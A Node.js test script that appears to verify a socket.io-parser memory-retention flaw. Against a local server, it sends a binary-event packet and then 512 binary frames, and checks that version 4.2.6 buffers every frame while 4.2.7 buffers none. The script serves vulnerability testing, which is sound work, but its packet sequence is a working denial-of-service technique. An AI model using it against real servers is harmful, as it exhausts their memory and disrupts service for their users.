import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { createServer } from "node:http";
import { createRequire } from "node:module";
import { join, resolve } from "node:path";

const [root, expected] = process.argv.slice(2);
assert.ok(expected === "vulnerable" || expected === "patched");
const resolvedRoot = resolve(root);
const require = createRequire(join(resolvedRoot, "package.json"));
const { Server } = require("socket.io");
const parserVersion = JSON.parse(
  readFileSync(
    join(resolvedRoot, "node_modules", "socket.io-parser", "package.json"),
    "utf8",
  ),
).version;
const httpServer = createServer();
const io = new Server(httpServer, { transports: ["websocket"] });
const connected = new Promise((resolve) => io.once("connection", resolve));

await new Promise((resolve, reject) => {
  httpServer.listen(0, "127.0.0.1", resolve);
  httpServer.once("error", reject);
});
const address = httpServer.address();
assert.ok(typeof address === "object" && address !== null);
const websocket = new WebSocket(
  `ws://127.0.0.1:${address.port}/socket.io/?EIO=4&transport=websocket`,
);
const openedPacket = new Promise((resolve, reject) => {
  websocket.addEventListener("message", resolve, { once: true });
  websocket.addEventListener("error", reject, { once: true });
});
await new Promise((resolve, reject) => {
  websocket.addEventListener("open", resolve, { once: true });
  websocket.addEventListener("error", reject, { once: true });
});
assert.match(String((await openedPacket).data), /^0/u);
websocket.send("40");
const socket = await connected;
await new Promise((resolve) => setTimeout(resolve, 25));

websocket.send('450-["evt"]');
await new Promise((resolve) => setTimeout(resolve, 50));

const frameCount = 512;
const frameBytes = 4_096;
if (expected === "vulnerable") {
  for (let index = 0; index < frameCount; index += 1) {
    websocket.send(new Uint8Array(frameBytes).fill(index & 0xff));
  }
  await new Promise((resolve) => setTimeout(resolve, 100));
}

const retained = socket.client.decoder.reconstructor?.buffers?.length ?? 0;
if (expected === "vulnerable") {
  assert.equal(parserVersion, "4.2.6");
  assert.equal(websocket.readyState, WebSocket.OPEN);
  assert.equal(retained, frameCount);
} else {
  assert.equal(parserVersion, "4.2.7");
  assert.equal(retained, 0);
}

websocket.close();
await new Promise((resolve) => io.close(resolve));
console.log(
  `${parserVersion} retained ${retained} network frames (${retained * frameBytes} bytes)`,
);
